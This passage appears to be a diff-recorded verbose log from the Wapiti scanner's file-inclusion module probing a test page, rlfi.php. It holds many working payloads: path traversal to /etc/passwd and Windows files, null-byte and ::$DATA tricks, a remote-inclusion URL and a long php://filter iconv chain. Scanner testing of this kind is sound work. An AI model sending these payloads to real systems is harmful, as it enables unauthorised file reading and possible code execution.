5.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:55:53.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:53.033 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:53.044 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:53.054 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:53.063 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:53.070 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:53.079 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:53.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:53.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:53.108 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:53.120 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.128 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:53.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:53.156 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:53.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:53.176 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:53.185 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:53.199 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:53.207 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:53.217 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:53.225 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:53.235 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.242 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=109%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.252 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:53.260 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:53.272 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:53.280 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:55:53.291 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:55:53.300 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:55:53.309 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:53.318 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.328 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=rlfi.php
+2024-03-20 16:55:53.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=rlfi.php%00
+2024-03-20 16:55:53.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=rlfi.php%3A%3A%24DATA
+2024-03-20 16:55:53.362 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:53.364 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&security_level=2
+2024-03-20 16:55:53.373 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&security_level=2
+2024-03-20 16:55:53.380 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.388 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.396 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.414 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:55:53.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&security_level=2
+2024-03-20 16:55:53.434 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:55:53.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.451 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.462 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:55:53.471 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&security_level=2
+2024-03-20 16:55:53.479 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&security_level=2
+2024-03-20 16:55:53.487 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.494 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.501 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.508 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.515 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.521 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.528 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.535 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.542 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.548 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.556 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.563 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.570 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&security_level=2
+2024-03-20 16:55:53.578 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.586 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.660 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.668 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.674 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.680 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.687 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.694 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.702 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.709 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.717 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.724 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
